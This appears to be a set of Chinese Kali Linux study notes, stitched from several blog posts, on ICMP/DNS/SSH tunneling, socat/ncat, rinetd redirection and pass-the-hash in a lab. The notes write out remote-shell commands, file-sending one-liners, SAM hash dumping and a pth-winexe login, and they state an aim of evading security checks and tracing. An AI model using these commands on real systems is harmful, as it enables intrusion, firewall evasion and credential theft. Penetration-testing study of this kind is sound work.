Kali Linux笔记(七十三)：ICMP隧道--ptunnel

发表于 2020-02-02 | 分类于 Kali
字数统计: 427 字 | 阅读时长 ≈ 1 分钟

1. ptunnle

  • Ping tunnel ICMP隧道工具
    • 通过ICMP echo（ping requests，8）和reply（ping reply，0）实现隧道
    • 适用于防火墙只允许ping出站流量的环境
    • 支持多并发连接、性能优
    • 支持身份验证
    • 需要root权限
    • 支持抓包
      • Win：winpcap
      • Linux：libpcap
    • 工作过程（指定Proxy的时候，需要指定目的地，客户端指定）
      • Proxy、Client、Destination
  • 服务器
    • 🔺命令：ptunnel -x 1234
  • 客户端
    • 🔺命令：sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234
  • 嵌套SSH隧道
    • 🔺命令：ssh -CNfg -D 7000 root@127.0.0.1 -p 2222
  • ▲ ptunnel直到目前的最新版仍存在拒绝服务漏洞
    • 0.72

2. 实验环境准备

  • Kali（Proxy&Destinatiom）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
  • Mono防火墙
    • 第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查
  • Kali（内网）
    • 网卡方式为Host-only方式，检查网络
    • 浏览器访问mono，检查防火墙规则
      • Protocol → ICMP
      • Sourece → LAN subnet
      • LAN DNS -> WAM PING
    • ping/上网尝试
  • Window XP SP3
    • 网卡方式为Host-only方式，检查网络

3. 实验

  • Kali（Proxy&Destinatiom）
    • 服务器：🔺命令：ptunnel -x 1234
    • 启动Wireshark抓包，查看发送的数据包内容（ICMP数据包）
  • Kali（内网）
    • 🔺命令：sudo ptunnel -h
    • 客户端：🔺命令：sudo ptunnel -p Kali的IP -lp 2222 -da 192.168.0.1 -dp 80 -x 1234
    • 浏览器访问127.0.0.1:2222进行尝试
  • Kali（Proxy&Destinatiom）
    • 开启SSH（修改SSH配置文件）
  • Kali（内网）
    • 🔺命令：sudo ptunnel -p Kali的IP -lp 2222 -da Kali的IP -dp 22 -x 1234
    • 🔺命令：ssh -CNfg -D 7000 root@127.0.0.1 -p 2222
  • Window XP SP3
    • 设置浏览器Internet代理，用内网Kali的IP:7000，上网尝试

Kali Linux笔记(七十二)：隧道传输工具--SOCAT

发表于 2020-02-02 | 分类于 Kali
字数统计: 763 字 | 阅读时长 ≈ 3 分钟

1. SOCAT

  • 被称为nc++（增强版的nc）
    • 双向数据流通道工具
  • 连接端口
    • 🔺命令：socat -（标准的输入输出） tcp:1.1.1.1:80（需要连接的目标）
  • 侦听端口
    • 🔺命令：socat - tcp4-listen:22 / socat - tcp-l:33
  • 接受文件
    • 🔺命令：socat tcp4-listen:333 open:2.txt,creat,append
  • 发送文件
    • 🔺命令：cat 1.txt | socat - tcp4:1.1.1.1:333
  • 远程shell–服务器端
    • 🔺命令：socat tcp-l:23 exec:sh,pty,stderr
  • 端口转发
    • 🔺命令：socat tcp4-listen:22,fork tcp4:1.1.1.1:22
  • 远程执行命令
    • 服务器：🔺命令：socat - udp-l:2001
    • 客户端：🔺命令："id" | socat - udp4-datagram:1.1.1.1:2001
  • UDP全端口任意内容发包
    • 🔺命令：for PORT in {1..65535}; do echo “aaaaa" | socat - UDP4-DATAGRAM: 1.1.1.1:$PORT; sleep .1; done
  • 二进制编辑器
    • 🔺命令：echo -e "\0\14\0\0\c" | socat -u - file:/usr/bin/ squid.exe,seek,seek=0x00074420
  • 简单的WEB服务
    • 🔺命令：socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:"echo -e \"\\ \"HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\"\"; cat; echo -e \"\\\"\\\n\ \\"\""

Kali Linux笔记(七十一)：隧道传输工具--NCAT

发表于 2020-02-02 | 分类于 Kali
字数统计: 235 字 | 阅读时长 ≈ 1 分钟

1. NCAT

  • 被称为众多NC衍生版软件中最优的选择
  • 代理功能（如果不指定端口，默认为31337）
    • 🔺命令：ncat -l 8080 --proxy-type http --proxy-auth user:pass
    • 浏览器设置代理服务器127.0.0.1:31337，进行网页访问
  • Broke中介功能
    • AB不同但AC、BC互通
    • 服务器：🔺命令：ncat -l 333 --broke
    • 客户端之间：发送任何信息都会被hub到其他客户端
    • 批量执行命令：🔺命令：ncat 1.1.1.1 --sh-exec "echopwd"
    • 批量传文件：🔺命令：ncat --send-only 1.1.1.1 < inputfile
  • 实验（Kail上的三个终端窗口进行模拟）
    • 1：🔺命令：ncat -l 333 --broke
    • 2/3：🔺命令：ncat localhost 333
    • 2：🔺命令：aaa → 3收得到信息
    • 3：🔺命令：bbb → 2收得到信息
    • 2：🔺命令：ncat 127.0.0.1 333 --sh-exec "echopwd" → 3进行pwd系统指令操作
    • 3：🔺命令：ncat --send-only 127.0.0.1 333 < a.php → 2收到a.php文件

1. DNS协议隧道–iodine

  • 基于DNS查询的隧道工具
  • 与同类工具相比的优点
    • 对下行数据不进行编码，因此性能优
    • 支持多平台：Linux、BSD、Mac OS、Windows
    • 最大16个并发连接
    • 强制密码支持
    • 支持同网段隧道IP（不同于服务器、客户端网段）
    • 支持多种DNS记录类型（自动协商使用的DNS记录类型）
    • 丰富的隧道质量检测措施

2. 实验环境（Linux）

Kali Linux笔记(六十九)：DNS隧道--dns2tcp

字数统计: 2.2k 字 | 阅读时长 ≈ 9 分钟

1. DNS协议隧道

  • 防火墙禁止TCP出站访问流量
    • SSH隧道、端口转发全部失效
    • 使用基于UDP协议的隧道
    • DNS的工作原理适合用于实现隧道
    • ▲ TCP53–域名服务的冗余更新，域名服务器之间的传输/UDP53–用于域名服务的查询
  • DNS工作原理

1. SSH隧道

  • SSH支持双向通信隧道
    • 将其他TCP端口的通信通过SSH链接来转发
    • 用SSH作为传输层协议，对流量自动加解密
    • 突破防火墙访问规则的限制，可用于翻墙
  • 本地端口转发
    • 本地侦听端口，访问转发到远程主机指定端口（SSH流量的流向/应用层流量一致）
    • 使效果类似于rinetd
    • 多个流量通过隧道进行转发
    • 将一本地端口与远程服务器建立隧道
    • ▲ SSH隧道建立侦听的端口在内网服务器，侦听的端口形象理解为外网服务器的隧道端口
  • 远程端口转发
    • 远程侦听端口，访问转发到本机主机指定端口（SSH流量的流向/应用层流量不一致）
    • ▲ SSH隧道建立侦听的端口在外网服务器，侦听的端口形象理解为内网服务器的隧道端口
  • 动态隧道模式

2. SSH本地端口转发

  • 将一本地端口与远程服务器建立隧道

Kali Linux笔记(六十五)：流量操控、重定向

发表于 2020-01-31 | 分类于 Kali
字数统计: 1.1k 字 | 阅读时长 ≈ 4 分钟

1. 流量操控技术

  • Traffic manipulation technique
  • 渗透测试中经常遇到访问受限的网络环境
    • 防火墙/交换机，端口映射相比于主机直接外网访问更安全
    • DNS，TCP/UDP的53端口，基本不过滤
    • SSH，22端口，基本不过滤
    • 通过与家里的电脑进行连接，达到可以访问其他网络资源的结果
  • 使用隐蔽的手段逃避安全检查措施和朔源追踪
    • 使明文传输的内容变成加密的内容，躲避安全检查
    • 跳转攻击源头难以追踪，使用肉鸡进行攻击
  • 证明看似严格的访问控制仍然存在弱点
  • 在非受信任的网络中实现安全的数据传输
    • 难以规避非受信任网络的中间人攻击（arp地址欺骗）
    • 通过与信任的节点进行连接，加密数据，达到数据转发传输的结果
  • 部分概念的实现过程略有烧脑

2. 流量操控技术

  • 重定向（Redirection）
    • IP、Port
    • 不进行加密处理，只是作为中间转发
  • 隧道（Tunneling）
    • 在不受信任的网络环境中实现安全的通信（两个节点之间的加密流量传输）
    • 通常使用多种加密技术建立通信隧道
    • 点到点（IP2IP）、端到端（Port2Port）
      • 点到点的安全只有在隧道之间，内网的传输是明文
      • 端到端是两个进程之间的加密，基本不存在中间人攻击
    • VPN
      • pptp（不太安全技术，客户端到目标网络，▲过程有几个明文传输）
      • l2tp（二层VPN技术，客户端到目标网络）
      • IPSec（安全性首选，站点到站点）
      • SSL vpn（端到端的VPN，客户端使用连接服务器）
      • SSH
  • 封装（encapsulation）
    • 通常结合在隧道中使用，使用一种协议封装一种协议（RPC o http、VoIP）
    • 使用网关设备实现不同类型网络的互联互通

3. 重定向

  • Rinetd
    • 安装：🔺命令：apt-get install rinetd
    • 配置：/etc/rinetd.conf（bindaddress bindport connectaddress connectport）
    • 运行：🔺命令：rinetd
  • 应用场景
    • 重定向web流量，突破上网限制
    • 远程桌面重定向
    • Nc重定向获得Shell
    • 不兼容FTP等二次连接的协议

4. 80端口Web服务访问

  • 安装monowall防火墙
    • 需要两块网卡，第一块网卡为连接内网的Host-Only网卡，第二块为连接外网的桥接网卡
    • 安装光盘放进去ISO文件
    • 选择7，Install on Hard Drive，安装在硬盘上
    • 输入设备ad0
    • 重启并拔出ISO光盘
  • monowall防火墙配置
    • 硬盘启动
    • 选择1，指定网卡接口，不需要vlan
    • 输入LAN局域网接口em0，输入WAN广域网接口em1，无需其他的端口设置
    • 重启设备
  • monowall再配置
    • 硬盘启动
    • 选择2，指定局域网IP地址，子网掩码（bit数），DHCP服务
    • 选择3，重置webGUI界面，重置为mono
    • 选择5，重启mono
  • 开启一台win xp sp3电脑
    • 选择Host-only网络
    • ifconfig/进行ping通信、上网尝试
  • 进入monowall防火墙管理界面
    • Rules，初始规则为LAN → Any
    • 删除默认规则，进行外网访问尝试
    • 新建一条规则，Action → Pass，Protocol → TCP/UDP，Destination port range → DNS
    • Apply进行应用
  • Kali网络设置为桥接
    • 需要访问墙外流量
    • 🔺命令：apt-get install rinetd
    • 🔺命令：vi /etc/rinetd.conf（指向的配置）
      • bindaddress（本机侦听IP）
      • bindport（本机侦听端口）
      • connectaddress（连接IP）
      • connectport（侦听的端口）
    • rinetd
  • Window Server 2003网络设置为桥接
    • 开启远程桌面，cmd修改管理员密码（net user administrator *）
    • 安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）
    • 修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）
    • 访问127.0.0.1进行尝试
  • Win xp访问Kali主机IP的53端口

5. 3389端口远程桌面访问

  • Kali设置
    • 🔺命令：vi /etc/rinetd.conf（指向的配置），修改connectport为3389端口
    • 🔺命令：pkill rinetd
    • 🔺命令：rinetd
  • Win xp访问远程桌面
    • Win+R → mstsc → Kali主机IP的53端口
    • 尝试登陆，ifconfig

6. NC获取shell

  • 思想：XP执行NC把自己的Shell发给Kali的53端口，转发给Window Server 2003，在Window Server 2003用nc来接受Shell
  • 🔺命令：cp /usr/share/windows-binaries/nc.exe /root/Desktop（拷贝到XP和2003的机子上）

    • 🔺命令：cmd → nc -nvlp 3333

    • 🔺命令：vi /etc/rinetd.conf（指向的配置），修改connectport为3333端口
    • 🔺命令：pkill rinetd
    • 🔺命令：rinetd
  • Window XP

1. Pass the Hash（PTH）

  • 密码破解耗费时间资源巨大
  • 使用密文提交给服务器直接完成身份认证
  • NTLM/LM是没有加严的静态HASH密文（▲传输密文每次都是一样的）
  • 企业中使用ghost等工具克隆安装系统
  • 操作
    • Win7插入一个Kali光盘，用光盘启动
    • 🔺命令：mount /dev/sda2 /mnt
    • 🔺命令：cd /mnt/Windows/System32/config
    • 🔺命令：samdump2 SYSTEM SAM
    • 使用nc传递HASH值
    • Win7光盘释放重启，关闭Win7防火墙
    • 🔺命令：pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8（用户名密码用%分卡） //Win7IP地址1.1.1.1 cmd
  • ▲ 只适用于Window系统
